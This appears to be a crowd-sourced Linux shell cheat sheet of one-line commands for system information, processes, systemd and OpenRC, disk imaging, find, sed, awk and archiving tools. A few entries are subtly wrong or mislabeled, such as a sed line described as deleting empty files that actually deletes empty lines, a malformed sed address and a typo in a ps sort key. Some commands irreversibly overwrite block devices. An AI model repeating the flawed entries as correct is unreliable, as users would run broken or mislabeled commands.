SYSTEM INFORMATION COMMANDS
===========================
(#) Show only errors and warnings: `dmesg --level=err,warn`
(#) View dmesg output in human readable format: `dmesg -T`
(#) Get an audio notification if a new device is attached to your computer: `dmesg -tW -l notice | gawk '{ if ($4 == "Attached") { system("echo New device attached | espeak") } }`
(#) Dmesg: follow/wait for new kernel messages: `dmesg -w`
(#) The proper way to read kernel messages in realtime.: `dmesg -wx`

($) Query graphics card: `lspci -nnk | grep -i VGA -A2`
($) Query sound card: `lspci -nnk | grep -i audio -A2`
($) Quick and dirty hardware summary: `(printf "\nCPU\n\n"; lscpu; printf "\nMEMORY\n\n"; free -h; printf "\nDISKS\n\n"; lsblk; printf "\nPCI\n\n"; lspci; printf "\nUSB\n\n"; lsusb; printf "\nNETWORK\n\n"; ifconfig) | less`
($) Percental CPU scaled load average: `printf "System load (1m/5m/15m): "; for l in 1 2 3 ; do printf "%.1f%s" "$(( $(cat /proc/loadavg | cut -f $l -d " ") * 100 / $(nproc) ))" "% "; done; printf "\n"`
($) Check whether laptop is running on battery or cable: `eval "$(printf "echo %s \$((%i * 100 / %i))\n" $(cat $(find /sys -name energy_now 2>/dev/null | head -1 | xargs dirname)/{status,energy_{now,full}}))%"`
($) Get battery stats: `DIR=$(find /sys -name energy_now -exec dirname {} \\; 2>/dev/null | head -1) && for STAT in $(find $DIR -maxdepth 1 -type f); do printf "%s %s\n" "$(basename $STAT)" "$(cat $STAT)"; done`
($) Is your machine plugged in?: `cat /sys/class/power_supply/AC/online`
($) Print your cpu intel architecture family: `cat /sys/devices/cpu/caps/pmu_name`
($) (OSX) Get CPU thermal data: `sysctl machdep.xcpm.cpu_thermal_level`
($) Quick integer CPU benchmark: `time cat /proc/cpuinfo | grep proc | wc -l| xargs seq | parallel -N 0 echo "2^2^20" '|' bc`
($) Small CPU benchmark with PI, bc and time.: `time cat /proc/cpuinfo | grep proc | wc -l | xargs seq | parallel -N 0 echo "scale=4000\; a\(1\)\*4" '|' bc -l`
($) Get device info for all USB devices: `echo /sys/bus/usb/devices/* | xargs udevadm info -q property -p`

($) List of commands you use most often: `history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head`
($) List of commands you use most often: `history | awk '{print $2}' | sort | uniq -c | sort -rn | head`
($) List all of the commands on your system that have a man page and a short description: `whatis -r .`

($) Create a file and manipulate the date: `touch -d '-1 year' /tmp/oldfile`
($) Get full path of a file: `readlink -f FILE`

($) See if a file is being used: `lsof /path/to/file`
($) To find out fonts that the `brave` browser is using: `for proc in $(ps -o pid --no-headers -C brave); do (lsof -p $proc | grep fonts | cut -f4); done`
($) List current processes writing to hard drive: `lsof | grep -e "[[:digit:]]\+w"`
($) Find which ports you probably want to open in your firewall on a fresh installed machine: `lsof -i -nlP | awk '{print $9, $8, $1}' | sed 's/.*://' | sort -u`

PROCESSES, DAEMONS AND ADMINISTRATION
=====================================
($) List all running processes: `ps aux`
($) List all running processes including the full command string: `ps auxww`
($) Search for a process that matches a string: `ps aux | grep string`
($) List all processes of the current user in extra full format: `ps --user $(id -u) -F`
($) List all processes of the current user as a tree: `ps --user $(id -u) f`
($) Get the parent PID of a process: `ps -o ppid= -p pid`
($) Sort processes by memory consumption: `ps --sort size`
($) List currently running processes: `ps auxww`
($) List all process of current user (full info): `ps --user NAME -F`
($) Show most memory intensive process: `ps axch -o cmd:15,%mem --sort=-%mem`
($) Show most CPU intensive process: `ps axch -o cmd:15,%cpu --sort=-%cpuw`
($) Monitor my process group tree: `watch "ps --forest -o pid=PID,tty=TTY,stat=STAT,time=TIME,pcpu=CPU,cmd=CMD -g $(ps -o sid= -p $(pgrep -f "<my_process_name>"))"`
($) Show top 50 running processes ordered by highest memory/cpu usage refreshing every 1s: `watch -n1 "ps aux --sort=-%mem,-%cpu | head -n 50"`
($) Perform Real-time Process Monitoring Using Watch Utility: `watch -n 1 'ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head'`
($) Sort processes by CPU Usage: `ps auxk -%cpu | head -n10`
($) Top 10 Memory Processes (reduced output to applications and %usage only): `ps aux | sort -rk 4,4 | head -n 10 | awk '{print $4,$11}'`
($) Top 10 Memory Processes: `ps aux | sort -rk 4,4 | head -n 10`

($) List all of the signals kill can send: `kill -l`
($) Hang up process: `kill -1 process_id`
($) Send interrupt to process: `kill -2 process_id`
($) Immediately terminate a process: `kill -9 process_id`
($) Hang up all processes that match a name: `pkill -9 "process_name"`
($) Close virtual terminal or logout, keeping all subprocess running: `disown -a && exit`

($) Show systemctl failed units: `systemctl --failed`
($) Show the status of a unit: `systemctl status NAMEOFUNIT`
($) Show all installed services: `systemctl list-unit-files --state=enabled --no-pager`
(#) Programmatic way to find and set your timezone: `timedatectl set-timezone $(curl -s worldtimeapi.org/api/ip.txt | sed -n 's/^timezone: //p')`
(#) Add a DNS server on the fly: `systemd-resolve --interface <NombreInterfaz> --set-dns <IPDNS> --set-domain mydomain.com`
(#) Restart Bluetooth: `systemctl restart bluetooth`
(#) Command to logout all the users in one command: `who | awk '!/root/{ cmd="/sbin/pkill -KILL -u " $1; system(cmd)}'`

($) List all accessed configuration files while executing a program in linux terminal (improved version): `strace 2>&1 <any_executable> | egrep -o "\".*\.conf\""`
($) Find which config-file is read: `strace 2>&1  geany | grep geany.conf`
($) Linux system calls of MySQL process: `strace -c -p $(pidof -s mysqld) -f -e trace=all`

(#) Using a single sudo to run multiple && arguments: `sudo -s <<< 'apt update -y && apt upgrade -y'`
(#) Using a single sudo to run multiple && arguments: `sudo sh -c 'apt update -y && apt upgrade -y'`

(#) Change a user's password: `passwd username`
(#) Change a user's name: `usermod -l newname user`
(#) Add user to supplementary groups (mind the whitespace): `usermod -a -G group1,group2 user`
(#) Create a new home directory for a user and move their files to it: `usermod -m -d path/to/home user`

SYSTEMD
=======

($) List the status of services (systemd): `systemctl status`
($) List failed services (systemd): `systemctl --failed`
($) Start a service system-wide (systemd): `systemctl start SERVICE`
($) Start an user service (systemd): `systemctl --user start SERVICE`
($) Enable a service system-wide (systemd): `systemctl enable SERVICE`
($) Enable a service system-wide now (systemd): `systemctl enable --now SERVICE`

OPENRC
======

(#) Start the ssh daemon in the default runlevel at boot: `rc-update add sshd default`
(#) Start the sshd service now: `rc-service sshd start`
(#) Check if the sshd service is running: `rc-service sshd status`
(#) Restart the sshd service: `rc-service sshd restart`
(#) Stop the sshd service: `rc-service sshd stop`
(#) List services, their status, and the runlevels they belong to: `rc-status --all`
(#) Show enabled services and the runlevels they belong to (not whether they are running or not, just if they are enabled): `rc-update show`

FILESYSTEMS
===========
($) Create ext4 filesystem with big count of inodes: `mkfs.ext4 -T news /dev/sdcXX`
($) Show allocated disk space:: `df -klP -t xfs -t ext2 -t ext3 -t ext4 -t reiserfs | grep -oE ' [0-9]{1,}( +[0-9]{1,})+' | awk '{sum_used += $1} END {printf "%.0f GB\n", sum_used/1024/1024}'`
($) Show used disk space:: `df -klP -t xfs -t ext2 -t ext3 -t ext4 -t reiserfs | grep -oE ' [0-9]{1,}( +[0-9]{1,})+' | awk '{sum_used += $2} END {printf "%.0f GB\n", sum_used/1024/1024}'`

(#) Flash an image onto a USB drive using cat: `cat path/to/archlinux-version-x86_64.iso > /dev/sdx`
(#) Flash an image onto a USB drive using cp: `cp path/to/archlinux-version-x86_64.iso /dev/sdx`
(#) Flash an image onto a USB drive using dd: `dd bs=4M if=path/to/archlinux-version-x86_64.iso of=/dev/sdx status=progress oflag=sync`
(#) Flash an image onto a USB drive using tee: `tee < path/to/archlinux-version-x86_64.iso > /dev/sdx`
(#) Write a bootable Linux .iso file directly to a USB-stick: `wget -O /dev/sdb https://cdimage.ubuntu.com/daily-live/current/eoan-desktop-amd64.iso`
(#) Mount an ISO: `mount -o loop /path/to/image.iso /media/mountpoint`
(#) Rip an ISO: run `isosize -x /dev/sr0` to determine sector count and size, then run `dd if=/dev/sr0 of=discimage.iso bs=SECTOR_SIZE count=SECTOR_COUNT status=progress`

LISTS AND STORAGE
=================
($) List permissions and ownership of contents of directory: `ls -l`
($) List hidden files, too, in a column: `ls -lA`
($) List all subdirectories (but omit . and ..): `ls -A1D`
($) List all contents, reversing results (most recent modified files on bottom): `ls -trA1`

($) Summarize the size of current directory on disk in a human-readable format: `du -sh`
($) See free disk space and mount points in a human readable format: `df -h`
($) Get partitions that are over 50% usage: `df -h | awk '{a=$5;gsub(/%/,"",a);if(a > 50){print $0}}'`
($) Currently mounted filesystems in nice layout: `mount | column -t`
($) Get the top 10 largest files ordered by size descending, starting from the current folder, recursively: `find . -printf '%s %p\n'| sort -nr | head -10`
($) Find 10 largest folders: `du -hsx * | sort -rh | head -10`
($) List the size (in human readable form) of all sub folders from the current location: `du -h -d1`
($) Du command without showing other mounted file systems: `du -h --max-depth=1 --one-file-system /`
($) Get total of inodes of root partition: `du --total --inodes / | egrep 'total$'`

($) Find top 10 largest files in /var directory (subdirectories and hidden files included ): `tree -ihafF /var | tr '[]' ' '| sort -k1hr|head -10`
($) Show permissions and ownership of directories to two levels: `tree -dpug -L 2`
($) Show directory structure to two levels with file size: `tree -ash -L 2`

($) Change to previous directory: `cd -`
($) Create multiple subfolders in one command.: `mkdir -p /path/folder{1..4}`
($) Create multiple subfolders in one command.: `mkdir -p /path/{folder1,folder2,folder3,folder4}`

DD
==
($) Iso to USB with dd and show progress status: `dd if=/backup/archlinux.iso of=/dev/sdb status=progress`
($) Iso to USB with dd and show progress status: `dd if=/home/kozanoglu/Downloads/XenServer-7.2.0-install-cd.iso | pv --eta --size 721420288 --progress --bytes --rate --wait > /dev/sdb`
($) Make a bootable USB drive from an isohybrid file (such like `archlinux-xxx.iso`) and show the progress: `dd if=file.iso of=/dev/usb_drive status=progress`
($) Clone a drive to another drive with 4 MiB block, ignore error and show progress: `dd if=/dev/source_drive of=/dev/dest_drive bs=4M conv=noerror status=progress`
($) Generate a file of 100 random bytes by using kernel random driver: `dd if=/dev/urandom of=random_file bs=100 count=1`
($) Benchmark the write performance of a disk: `dd if=/dev/zero of=file_1GB bs=1024 count=1000000`
($) Generate a system backup into an IMG file and show the progress: `dd if=/dev/drive_device of=path/to/file.img status=progress`
($) Restore a drive from an IMG file and show the progress: `dd if=path/to/file.img of=/dev/drive_device status=progress`
($) Check progress of an ongoing dd operation (Run this command from another shell): `kill -USR1 $(pgrep ^dd)`

GREP
====
($) Search for a pattern within a file: `grep "SeArChPaTtErN" path/to/file`
($) Only show matching patterns (o) and line number (n): `grep -on "SeArChPaTtErN" file.cpp`
($) Search for a pattern with case-insensitivity: `grep -i "TODO" file.cpp`
($) Search for a pattern in all files recursively from current directory (skip binary files): `grep -rnI "SeArChPaTtErN" .`

($) Find a matching pattern and print 3 lines after the match: `grep -A3 "SeArChPaTtErN" path/to/file`
($) Find a matching pattern and print 3 lines before the match: `grep -B3 "SeArChPaTtErN" path/to/file`
($) Find a matching pattern and print 3 lines before and after the match: `grep -C3 "SeArChPaTtErN" path/to/file`
($) Match all line that do not match a pattern: `grep -v "roses" poem.txt`
($) Search for an exact string (disables regular expressions): `grep -F "exact_string" path/to/file`
($) Use Perl regex to find the first occurence of 'K' and every character thereafter: `grep -Po '^(.*?:\K)?.*'`
($) Colorize grep output: `grep --color -E 'pattern|$' file`
($) Colorize sequences of digits: `echo abcd89efghij340.20kl | grep --color -e "[0-9]\+" -e "$"`
($) Extract email addresses from file.txt: `grep -Eio '([[:alnum:]_.-]{1,64}@[[:alnum:]_.-]{1,252}?\.[[:alpha:].]{2,6})' file.txt`

HEADS AND TAILS
===============
($) Get the last 10 lines of a file: `tail file.txt`
($) Get the last 20 lines of a file: `tail -n20 file.txt`

($) Watch the output of a file continously and filter: `tail -f path/to/file | grep "SeArChPaTtErN"`
($) Watch and filter a file continously (even if it doesn't exist yet): `tail -F path/to/file | grep "SeArChPaTtErN"`
($) Filter the output of a file continously using tail and grep: `tail -f file.txt | grep --line-buffered ""`
($) Display the end of a logfile as new lines are added to the end: `tail -f logfile`
($) Re-execute a command using a saved /proc/pid/cmdline file: `tail -zn+2 $CMDLINE_FILENAME | xargs -0 $COMMAND`
($) Realtime lines per second in a log file, with history: `tail -f access.log | pv -l -i10 -r -f 2>&1 >/dev/null  | tr /\\r \ \\n`
($) Tail a log and replace according to a sed pattern: `tail -F logfile|while read l; do sed 's/find/replace/g' <<< $l; done`

($) Output the first 10 lines of a file: `head filename`
($) Output the first 20 lines of a file: `head -n20 filename`

($) Output the first 239 bytes of a file: `head -c239 filename`
($) Output everything but the last 24 lines of a file: `head -n -24 filename`
($) Output everything but the last 172 bytes of a file: `head -c -172 filename`

CUT, TR, AND COLUMN
===================
($) Cut out the first sixteen characters of each line of stdin: `cut -c 1-16`
($) Cut out the first sixteen characters of each line of the given files: `cut -c 1-16 file`
($) Cut out everything from the 3rd character to the end of each line: `cut -c 3-`
($) Cut out the fifth field of each line, using a colon as a field delimiter (default delimiter is tab): `cut -d':' -f5`
($) Cut out the 2nd and 10th fields of each line, using a semicolon as a delimiter: `cut -d';' -f2,10`
($) Cut out the fields 3 through to the end of each line, using a space as a delimiter: `cut -d' ' -f3-`
($) Extract column from csv file: `cut -d"," -f9`

($) Replace all occurrences of a character in a file, and print the result: `tr find_character replace_character < filename`
($) Replace all occurrences of a character from another command's output: `echo text | tr find_character replace_character`
($) Map each character of the first set to the corresponding character of the second set: `tr 'abcd' 'jkmn' < filename`
($) Delete all occurrences of the specified set of characters from the input: `tr -d 'input_characters' < filename`
($) Compress a series of identical characters to a single character: `tr -s 'input_characters' < filename`
($) Translate the contents of a file to upper-case: `tr "[:lower:]" "[:upper:]" < filename`
($) Strip out non-printable characters from a file: `tr -cd "[:print:]" < filename`

($) Format the output of a command for a 30 characters wide display: `printf "header1 header2\nbar foo\n" | column --output-width 30`
($) Split columns automatically and auto-align them in a tabular format: `printf "header1 header2\nbar foo\n" | column --table`
($) Specify the column delimiter character for the `--table` option (e.g. "," for CSV) (defaults to whitespace): `printf "header1,header2\nbar,foo\n" | column --table --separator ,`
($) Fill rows before filling columns: `printf "header1\nbar\nfoobar\n" | column --output-width 30 --fillrows`
($) Nicely format a CSV file: `column -s, -t < somefile.csv | less -#2 -N -S`

SEQUENCES AND LOOPS
===================
($) Shell bash iterate number range with for loop: `seq 10 20`
($) Generate a sequence of numbers.: `seq 12`
($) Generate a sequence of numbers.: `for ((i=1; i<=99; ++i)); do echo $i; done`
($) Shell bash iterate number range with for loop: `for((i=1;i<=10;i++)){ echo $i; }`
($) Iterate over a number range: `for i in $(seq 1 5) ; do echo $i ; done`
($) Iterate over a number range: `for i in {1..10}; do echo $i; done`

FIND
====
($) Find all jpg files in 'work' directory: `find ./work -name "*.jpg"`
($) Find files only, matching a glob pattern: `find -name "*homework*" -type f`
($) Find all executable files: `find -executable -type f`
($) Find all files in current directory excluding `.wine` and `.git` directories: `find . -type f \! \( -path '*/\.wine/*' -o -path '*/\.git/*' \)`
($) Find files only, matching a glob pattern, but omit '.git' directory: `find . -name "homework" -type f \! \( -path '*/\.git/*' \)`
($) Find today's files only: `find directory_path -maxdepth 1 -daystart -mtime -1`
($) Find from here, recently accessed files: `find . -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2- | head`
($) Find image files by common extension: `find . \( -iname '*.tiff' -or -iname '*.tif'  -or -iname '*.bmp'  -or -iname '*.jpeg' -or -iname '*.jpg'  -or -iname '*.gif'  -or -iname '*.png'  -or -iname '*.heic' -or -iname '*.raw' -or -iname '*.cr2' -or -iname '*.nef' -or -iname '*.orf' -or -iname '*.sr2' \)`

($) Find all files matching glob and create one zip file: `find . -name "*.jpg" -print | zip newZipFile.zip -@`
($) Find all files that are larger than 20MB starting in home directory: `find "$HOME" -type f -size +20000k -exec ls -lh {} \; 2> /dev/null | awk '{ print $NF ": " $5 }' | sort -nrk 2,2`
($) Find and delete all files recursively, by extension: `find . -name "*.jpg" -delete`
($) Find out which directory uses most inodes - list total sum of directoryname existing on filesystem: `find /etc -xdev -printf '%h\n' | sort | uniq -c | sort -k 1 -n`
($) Find from here, inside files recursively and replace a string: `find . -type f -exec sed -i 's/OLDSTRING/NEWSTRING/g' {} +`

($) Find all pdfs and add '_small' to the name (renaming and shell substitution): `for FILE in $(find . -name "*.pdf" -print); do mv $FILE ${FILE%%.pdf}_small.pdf; done`
($) Find files, possibly with spaces in filenames and use sxiv to display any images (brute): `find . -type f -print0 | xargs -0 sxiv -t &>/dev/null`
($) Find dupe files by checking md5sum: `find . -type f | grep '([0-9]\{1,9\})\.[^.]\+$' | parallel -n1 -j200% md5sum ::: | awk 'x[$1]++ { print $2 " :::"}'| sed 's/^/Dupe: /g'| sed 's,Dupe,\x1B[31m&\x1B[0m,'`
($) Find ASCII files and extract IP addresses: `find . -type f -exec grep -Iq . {} \; -exec grep -oE "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" {} /dev/null \;`
($) Find all images by mime type: `find /path/to/crawl -type f -exec file --mime-type {}  \; | awk '{if ($NF == "image/jpeg") print $0 }'`

($) Check if the same table name exist across different databases: `find . -name "withdrownblocks.frm"  | sort -u | awk -F'/' '{print $3}' | wc  -l`
($) Graphical tree of sub-directories with files: `find . -print | sed -e 's;[^/]*/;|-- ;g;s;-- |;   |;g'`
($) Moving large number of files: `find /source/directory -mindepth 1 -maxdepth 1 -name '*'  -print0 | xargs -0 mv -t /target/directory;`
($) List only empty directories and delete safely (=ask for each): `find . -type d -empty -exec rm -i -R {} \;`
($) Summarize the size of subdirectories in the current directory: `find . -maxdepth 1 -mindepth 1 -type d -exec du -skx {} \; | sort -n`
($) Find ASCII files and extract IP addresses: `find . -type f -exec grep -Iq . {} \; -exec grep -oE "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" {} /dev/null \;`
($) Remove scripts tags from *.html and *.htm files under the current directory: `find ./ -type f \( -iname '*.html' -or -iname '*.htm' \) -exec sed -i '/<script/,/<\/script>/d' '{}' \;`
($) Recursive search and replace (with bash only): `find ./ -type f -name "somefile.txt" -exec sed -i -e 's/foo/bar/g' {} \;`
($) Find non-standard files in mysql data directory: `find . -type f -not -name "*.frm" -not -name "*.MYI" -not -name "*.MYD" -not -name "*.TRG" -not -name "*.TRN" -not -name "db.opt"`
($) Find hard linked files (duplicate inodes) recursively: `find . -type f -printf '%10i %p\n' | sort | uniq -w 11 -d -D | less`
($) Find sparse files: `find -type f -printf "%S=:=%p\n" 2>/dev/null | gawk -F'=:=' '{if ($1 < 1.0) print $1,$2}'`
($) Find non-ASCII and UTF-8 files in the current directory: `find . -type f -regex '.*\.\(cpp\|h\)' -exec file {} + | grep "UTF-8\|extended-ASCII"`
($) Replace lines in files with only spaces/tabs with simple empty line (within current directory - recursive): `find . -type f -regex '.*\.\(cpp\|h\)' -exec sed -i 's/^[[:blank:]]\+$//g' {} +`
($) Find the top 10 directories containing the highest number of files: `find / -type f ! -regex '^/\(dev\|proc\|run\|sys\).*' | sed 's@^\(.*\)/[^/]*$@\1@' | sort | uniq -c | sort -n | tail -n 10`
($) Find directory with most inodes/files: `find / -xdev -printf '%h\n' | sort | uniq -c | sort -k 1 -n | tail`
($) Count the total amount of hours of your music collection: `find . -print0 | xargs -0 -P 40 -n 1 sh -c 'ffmpeg -i "$1" 2>&1 | grep "Duration:" | cut -d " " -f 4 | sed "s/.$//" | tr "." ":"' - | awk -F ':' '{ sum1+=$1; sum2+=$2; sum3+=$3; sum4+=$4 } END { printf "%.0f:%.0f:%.0f.%.0f\n", sum1, sum2, sum3, sum4 }'`
($) Find all file extension in current dir.: `find . -type f | perl -ne 'print $1 if m/\.([^.\/]+)$/' | sort -u`

SED
===
($) Replace the first occurrence of a regular expression in each line of a file, and print the result: `sed 's/regex/replace/' filename`
($) Replace all occurrences of an extended regular expression in a file, and print the result: `sed -r 's/regex/replace/g' filename`
($) Replace all occurrences of a string in a file, overwriting the file (i.e. in-place): `sed -i 's/find/replace/g' filename`
($) Replace only on lines matching the line pattern: `sed '/line_pattern/s/find/replace/' filename`
($) Delete lines matching the line pattern: `sed '/line_pattern/d' filename`
($) Print the first 11 lines of a file: `sed 11q filename`
($) Apply multiple find-replace expressions to a file: `sed -e 's/find/replace/' -e 's/find/replace/' filename`
($) Replace separator `/` by any other character not used in the find or replace patterns, e.g., `#`: `sed 's#find#replace#' filename`
($) Replace strings in text: `sed -e 's/dapper/edgy/g' -i /etc/apt/sources.list`
($) This will allow you to browse web sites using "-dump" with elinks while you still are logged in: `sed -i 's/show_formhist = 1/show_formhist = 0/;s/confirm_submit = 0/confirm_submit = 1/g' /etc/elinks/elinks.conf; elinks -dump https://facebook.com`
($) Get line number 12 from a file (n supresses lines not matching): `sed -n '12p' file`
($) Print a specific range of lines (n supresses lines not matching): `sed -n '7,24 p' file`
($) Remove abstracts from a bibtex file: `sed '/^\s*abstract\s*=\s*{[^\n]*},$/ d' input.bib > output.bib`
($) Delete at start of each line until character: `sed 's/^[^:]*://g'`
($) Remove all matches containing a string until its next space: `sed 's/linux-[^ ]* \{0,1\}//g' /path/to/file`
($) Remove ^M characters from file using sed: `sed 's/\r//g' < input.txt >  output.txt`
($) Replace all backward slashes with forward slashes: `echo 'C:\Windows\' | sed 's|\\|\/|g'`
($) Print one line: `sed -n '10p' myfile.txt`
($) Do replacement on all lines except line 5: `sed '5!/s/foo/bar/' file.txt`
($) Do replacement on lines matching regex (eg: lines starting with 'hello'): `sed '/^hello/ s/h/H/' file.txt `
($) Do replacement from line 5 to end of file: `sed '5,$ s/foo/bar/' file.txt `
($) Delete empty files: `sed  '/^$/d' file`
($) Print lines between two regex matches: `sed -nE '/^foo/,/^bar/p' file.txt`
($) Use custom delimiters to make it easy for some strings that contain slashes: `sed 's_/bin/bash_/bin/sh_' file.txt `
($) Custom delimiters for regex address combined with the classical delimiter for substitute command (you could also use there a custom delimiter). Useful for paths.: `sed '\_/bin/bash_s/grep/egrep/' file.txt`
($) Insert a space between lowercase/Uppercase characters using & (which represents the regex match): `sed 's/[a-zA-Z]/& /g' file.txt `
($) Keep the first word of every line (where word is defined by alphanumeric chars + underscores for simplicity sake): `sed -E 's_[a-zA-Z0-9_]+.*_\1_' file.txt `
($) Switch the first two words : `sed -E 's_([a-zA-Z0-9_]*) ([a-zA-Z0-9_]*)_\2 \1_' f1`
($) Remove duplicate words separated by a single space (but not triplicate): `sed -E 's_([a-zA-Z0-9_]+) \1_\1_ig' f1`
($) Search and replace for pattern, write just the lines with the replacements in a new file: `sed  's_foo_bar_w replaced.txt' file.txt  `
($) Multiple replacements: `sed -e 's_foo_bar_' -e 's_hello_HELLO_' file.txt `
($) Multiple commands using the ; operator which in theory concatenates commands: `sed '10p;5i\"INSERTED BEFORE LINE 5" file.txt `
($) Remove comments between lines starting with these two keywords. Empty lines will be put there instead: `sed -E '/start/,/end/ s/#.*//' file.txt `
($) Delete comments starting with # (no empty lines left behind): `sed -E '/^#/d' f1`
($) Insert an empty line after pattern  (after each line containing comment in this case): `sed '/^#/G' file.txt `
($) View lines minus lines between line starting with pattern and end of file : `sed  '/start/,$ d' file.txt `
($) View lines except lines between line starting with pattern and line ending with pattern: `sed -rn '/start/,/end/ !p' file.txt `
($) Print until you encounter pattern then quit: `sed  '/start/q' file.txt `
($) Insert contents of file after a certain line: `sed  '5 r newfile.txt' file.txt `
($) Append text after lines containing regex (AFTER FOO): `sed '/foo/a\AFTER FOO' file.txt `
($) Insert text after lines containing regex (BEFORE FOO): `sed '/foo/i\BEFORE FOO' file.txt `
($) Change line containing regex match: `sed '/foo/c\FOO IS CHANGED' file.txt `
($) Transform text: `sed 'y/abc/ABC/' file.txt `
($) Copy all the comments (starting with #) to a new file: `sed -E '/^#/w comments.txt' file.txt `
($) Print every second line (substitute ~3 for third line, etc): `sed -n '1~2p' file.txt `
($) Edit file in place but also create a backup: `sed -i.bak 's/hello/HELLO/' file.txt `
($) Append two extra lines after regex match: `sed -E '/^#/G G' file.txt `

DIFF AND COMM
=============
($) Comparison between the execution output of the last and penultimate command: `diff <(!!) <(!-2)`
($) Show the difference: `diff file1 file2 --side-by-side --suppress-common-lines`
($) Compare mysql db schema from two different servers: `diff <(mysqldump -hsystem db_name --no-data --routines) <(mysqldump -hsystem2 db_name --no-data --routines) --side-by-side --suppress-common-lines --width=690 | more`
($) Check difference between two file directories recursively: `diff <(tree /dir/one) <(tree /dir/two)`

($) Produce three tab-separated columns: lines only in first file, lines only in second file and common lines: `comm file1 file2`
($) Print only lines common to both files: `comm -12 file1 file2`
($) Print only lines common to both files, reading one file from `stdin`: `cat file1 | comm -12 - file2`
($) Get lines only found in first file, saving the result to a third file: `comm -23 file1 file2 > file1_only`
($) Print lines only found in second file, when the files aren't sorted: `comm -13 <(sort file1) <(sort file2)`

AWK
===
($) Print the fifth column (a.k.a. field) in a space-separated file: `awk '{print $5}' filename`
($) Print the second column of the lines containing "foo" in a space-separated file: `awk '/foo/ {print $2}' filename`
($) Print the last column of each line in a file, using a comma (instead of space) as a field separator: `awk -F ',' '{print $NF}' filename`
($) Sum the values in the first column of a file and print the total: `awk '{s+=$1} END {print s}' filename`
($) Print every third line starting from the first line: `awk 'NR%3==1' filename`
($) Print different values based on conditions: `awk '{if ($1 == "foo") print "Exact match foo"; else if ($1 ~ "bar") print "Partial match bar"; else print "Baz"}' filename`
($) Print all lines where the 10th column value equals the specified value : `awk '($10 == value)' filename`
($) Print all the lines which the 10th column value is between a min and a max : `awk '($10 >= min_value && $10 <= max_value)'`
($) Print lines in a text file with numbers in first column higher or equal than a value: `awk '$NF >= 134000000 {print $0}' single-column-numbers.txt`
($) AWK calculator: `calc(){ awk "BEGIN{ print $* }" ;}; calc "((3+(2^3)) * 34^2 / 9)-75.89"`

PERL
====
($) Parse and execute a Perl script: `perl script.pl`
($) Check syntax errors on a Perl script: `perl -c script.pl`
($) Parse and execute a Perl statement: `perl -e perl_statement`
($) Run a Perl script in debug mode, using `perldebug`: `perl -d script.pl`
($) Loo[p] over all lines of a file, editing them [i]n-place using a find/replace [e]xpression: `perl -p -i -e 's/find/replace/g' filename`
($) Run a find/replace expression on a file, saving the original file with a given extension: `perl -p -i'.old' -e 's/find/replace/g' filename`
($) Run a multiline find/replace expression on a file, and save the result in another file: `perl -p0e 's/foo\nbar/foobar/g' input_file > output_file`
($) Run a regular expression on stdin, printing out the first capture group for each line: `cat path/to/input_file | perl -nle 'if (/.*(foo).*/) {print "$1"; last;}'`
($) Calculate the mean or average of a single column of numbers in a text file: `perl -lane '$total += $F[0]; END{print $total/$.}' single-column-numbers.txt`
($) Shuffle lines via perl: `seq 1 9 | perl -e 'print sort { (-1,1)[rand(2)] } <>'`
($) Shuffle lines via perl: `seq 1 9 | perl -MList::Util=shuffle -e 'print shuffle <>;'`

ZIP
===
($) Zip all JPG files in the current directory to a zip file: `zip images.zip *.jpg`
($) Zip multiple files and directories recursively: `zip -r archive.zip *.jpg ./mydir1 ./mydir2`
($) Zip but exclude everything in the private directory: `zip -r compressed.zip ./mydir -x '*private/*'`
($) Archive a directory and its contents with the highest level [9] of compression: `zip -r -9 compressed.zip ./mydir`
($) Create an encrypted archive (user will be prompted for a password): `zip -e -r compressed.zip path/to/directory`
($) Add files to an existing zip file: `zip compressed.zip path/to/file`
($) Delete all tmp files from the foo directory in an existing zip file: `zip -d compressed.zip "foo/*.tmp"`
($) Archive a directory and its contents to a multi-part split zip file (e.g. 3 GB parts): `zip -r -s 3g compressed.zip path/to/directory`
($) List files within a specified archive (without extracting them): `zip -sf compressed.zip`

($) Extract zip file(s) (for multiple files, separate file paths by spaces): `unzip file(s)`
($) Extract zip files(s) to given path: `unzip compressed_file(s) -d path/to/put/extracted_file(s)`
($) List the contents of a zip file without extracting: `unzip -l file.zip`
($) Extract the contents of the file(s) to stdout alongside the extracted file names: `unzip -c file.zip`
($) Extract a zip file created on Windows, containing files with non-ASCII (e.g. Chinese or Japanese characters) filenames: `unzip -O gbk file.zip`
($) Make a dedicated folder for each zip file: `for f in *.zip; do unzip -d "${f%*.zip}" "$f"; done`

GZIP
====
($) Compress a file, replacing it with a gzipped compressed version: `gzip file.ext`
($) Decompress a file, replacing it with the original uncompressed version: `gzip -d file.ext.gz`
($) Compress a file, keeping the original file: `gzip --keep file.ext`
($) Compress a file specifying the output filename: `gzip -c file.ext > compressed_file.ext.gz`
($) Decompress a gzipped file specifying the output filename: `gzip -c -d file.ext.gz > uncompressed_file.ext`
($) Specify the compression level. 1=Fastest (Worst): `gzip -9 -c file.ext > compressed_file.ext.gz`

($) Extract a file from an archive, replacing the original file if it exists: `gunzip archive.tar.gz`
($) Extract a file to a target destination: `gunzip --stdout archive.tar.gz > archive.tar`
($) Extract a file and keep the archive file: `gunzip --keep archive.tar.gz`
($) List the contents of a compressed file: `gunzip --list file.txt.gz`

BZIP2
=====
($) Compress a file: `bzip2 path/to/file_to_compress`
($) Decompress a file: `bzip2 -d path/to/compressed_file.bz2`
($) Decompress a file to standard output: `bzip2 -dc path/to/compressed_file.bz2`
($) Extracts blocks from damaged .bz2 files: `bzip2recover damaged_file_name`

XZ
==
($) Compress a file to the xz file format: `xz file`
($) Decompress a xz file: `xz -d file.xz`
($) Compress a file to the LZMA file format: `xz --format=lzma file`
($) Decompress an LZMA file: `xz -d --format=lzma file.lzma`
($) Decompress a file and write to stdout: `xz -dc file.xz`
